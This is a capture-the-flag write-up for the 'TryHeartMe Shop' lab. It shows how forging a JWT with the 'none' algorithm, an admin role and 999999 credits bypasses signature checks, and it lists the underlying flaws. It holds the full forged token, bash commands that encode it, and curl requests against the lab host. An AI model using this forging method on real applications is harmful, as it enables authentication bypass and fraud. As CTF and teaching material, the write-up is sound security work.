# TryHeartMe Shop - CTF Writeup

## Challenge Information
- **Challenge Name:** TryHeartMe Shop
- **Target:** `http://10.80.154.7:5000`
- **Vulnerability:** JWT Algorithm Confusion Attack (None Algorithm)

## Reconnaissance

The challenge presented a Valentine's Day themed e-commerce platform where users could purchase items using credits. The objective was to purchase a hidden item called "Valenflag" which would reveal the flag.

Initial exploration revealed:
- Flask/Werkzeug web application on port 5000
- Authentication via JWT stored in cookies (`tryheartme_jwt`)
- User account with 0 credits (insufficient to purchase items)
- Various Valentine's themed products available in the shop

## Vulnerability Analysis

### JWT Structure Analysis
Upon logging in, the application issued a JWT token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVzZXJAbWFpbC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3MTA2NTQ5NywidGhlbWUiOiJ2YWxlbnRpbmUifQ.G_eevQLQ-wdSd-JsrS3YcJc6v2Sj09qUON7wSMwllp0
```

Decoded JWT revealed:
```json
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "email": "user@mail.com",
  "role": "user",
  "credits": 0,
  "iat": 1771065497,
  "theme": "valentine"
}
```

### Key Observations:
1. Credits were set to 0, preventing purchases
2. User role was "user" (potential admin role exists)
3. JWT used HS256 algorithm
4. Application likely vulnerable to JWT algorithm confusion attack

## Exploitation

### Step 1: JWT Algorithm Confusion Attack
The application was vulnerable to the "none" algorithm attack, where the signature verification can be bypassed by changing the algorithm to "none" and removing the signature.

Created a modified JWT with:
- Algorithm changed from "HS256" to "none"
- Credits increased to 999999
- Role elevated from "user" to "admin"
- Empty signature (token ends with a dot)

**Modified JWT Header:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Modified JWT Payload:**
```json
{
  "email": "user@mail.com",
  "role": "admin",
  "credits": 999999,
  "iat": 1771065497,
  "theme": "valentine"
}
```

**Crafted Malicious JWT:**
```bash
# Encode header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='

# Encode payload
echo -n '{"email":"user@mail.com","role":"admin","credits":999999,"iat":1771065497,"theme":"valentine"}' | base64 | tr '+/' '-_' | tr -d '='

# Final JWT (note the trailing dot with no signature)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InVzZXJAbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjo5OTk5OTksImlhdCI6MTc3MTA2NTQ5NywidGhlbWUiOiJ2YWxlbnRpbmUifQ.
```

### Step 2: Accessing Hidden "Valenflag" Item
With the modified JWT granting admin privileges and sufficient credits, the hidden "Valenflag" product became accessible.

Accessed the hidden product directly:
```bash
curl http://10.80.154.7:5000/product/valenflag \
  -H "Cookie: tryheartme_jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InVzZXJAbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjo5OTk5OTksImlhdCI6MTc3MTA2NTQ5NywidGhlbWUiOiJ2YWxlbnRpbmUifQ."
```

Product details revealed:
- **Item:** ValenFlag
- **Description:** "Buy me for special Valentines flag"
- **Price:** 777 credits

### Step 3: Purchasing the Flag
Submitted purchase request with the modified JWT:
```bash
curl -X POST http://10.80.154.7:5000/buy/valenflag \
  -H "Cookie: tryheartme_jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InVzZXJAbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjo5OTk5OTksImlhdCI6MTc3MTA2NTQ5NywidGhlbWUiOiJ2YWxlbnRpbmUifQ." \
  -H "Content-Type: application/x-www-form-urlencoded"
```

The application accepted the purchase and redirected to the receipt page.

### Step 4: Flag Retrieval
Accessed the receipt to retrieve the flag:
```bash
curl http://10.80.154.7:5000/receipt/valenflag \
  -H "Cookie: tryheartme_jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InVzZXJAbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjo5OTk5OTksImlhdCI6MTc3MTA2NTQ5NywidGhlbWUiOiJ2YWxlbnRpbmUifQ."
```

The receipt page displayed:
```
Order Details:
- Item: ValenFlag
- Price: 777 credits
- Remaining: 999999 credits
- Account: user@mail.com

Voucher:
ValenFlag redeemed
THM{...}
```

## Attack Chain Summary

1. **Reconnaissance** → Identified Flask application with JWT-based authentication
2. **JWT Analysis** → Decoded token revealing HS256 algorithm and user claims
3. **Vulnerability Discovery** → Identified JWT algorithm confusion vulnerability
4. **JWT Manipulation** → Crafted malicious token with "none" algorithm
5. **Privilege Escalation** → Modified role to "admin" and credits to 999999
6. **Hidden Item Access** → Discovered and accessed `/product/valenflag` endpoint
7. **Purchase Exploit** → Successfully purchased Valenflag item with forged JWT
8. **Flag Capture** → Retrieved flag from purchase receipt

## Key Vulnerabilities

1. **JWT Algorithm Confusion** - Application accepted "none" algorithm, bypassing signature verification
2. **Insufficient JWT Validation** - No proper algorithm whitelist enforcement
3. **Client-Side Trust** - Application trusted user-provided JWT claims without server-side validation
4. **Missing Signature Verification** - Token signature not properly validated
5. **Predictable Resources** - Hidden items accessible via predictable URL patterns
